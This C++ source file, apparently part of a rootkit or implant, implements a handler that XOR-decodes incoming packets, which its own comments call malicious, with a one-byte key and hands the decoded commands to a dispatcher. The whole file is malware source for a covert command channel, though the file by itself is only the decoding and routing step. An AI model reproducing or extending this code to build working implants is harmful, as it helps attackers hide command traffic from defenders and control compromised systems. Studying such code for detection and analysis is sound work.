/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 *
 * COPYRIGHT Bill Demirkapi 2020
 */
#include "XorPacketHandler.h"

/**
    Deobfuscates a XOR'd packet and dispatches it.
    @param FullPacket - Pointer to the full malicious packet.
    @return Whether or not dispatching was successful.
*/
NTSTATUS
XorPacketHandler::ProcessPacket (
    _In_ PBASE_PACKET FullPacket
    )
{
    PXOR_PACKET xorPacket;
    ULONG xorContentSize;
    ULONG i;
    PBASE_PACKET xorBasePacket;

    //
    // Cast the FullPacket to a XOR packet.
    //
    xorPacket = RCAST<PXOR_PACKET>(FullPacket);

    //
    // Obtain the size of the XorContent by subtracting the
    // offset of XorContent from the total packet length.
    //
    xorContentSize = xorPacket->Base.PacketLength - FIELD_OFFSET(XOR_PACKET, XorContent);

    DBGPRINT("XorPacketHandler!ProcessPacket: Received XOR packet with content size %i and key 0x%02X.\n", xorContentSize, xorPacket->XorKey);

    //
    // Enumerate the XorContent and deobfuscate every byte with XOR.
    //
    for (i = 0; i < xorContentSize; i++)
    {
        xorPacket->XorContent[i] ^= xorPacket->XorKey;
    }

    //
    // After deobfuscation, the XorContent is simply a BASE_PACKET.
    //
    xorBasePacket = RCAST<PBASE_PACKET>(&xorPacket->XorContent);
    
    //
    // Dispatch the deobfuscated packet.
    //
    return this->PacketDispatch->Dispatch(xorBasePacket);
}